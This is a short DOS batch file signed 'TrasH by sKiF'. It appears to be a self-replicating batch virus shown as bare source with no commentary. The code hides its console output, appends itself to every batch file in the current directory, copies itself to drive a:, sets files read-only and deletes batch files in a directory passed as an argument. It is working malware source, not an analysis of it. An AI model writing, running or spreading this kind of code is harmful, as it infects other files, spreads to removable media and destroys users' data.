   ::TrasH by sKiF :)
   @Echo off
   @ctty nul
   Attrib %0 +r
   Set a=%%a
   Set Trace=%2
   Copy %1*.bat %2\
   Copy %0 Virii.tmp
   For %a% in (*.b*t) do typ%1e Virii.tmp>>c:\%a% | copy c:\%a% %a%
   Attrib %1*.bat +r
   Copy %0 a:\ /y > nul
   Del %Trace%\*.bat
   Del Virii.tmp /q
   Set Trace=
   Set a=
   ctty con
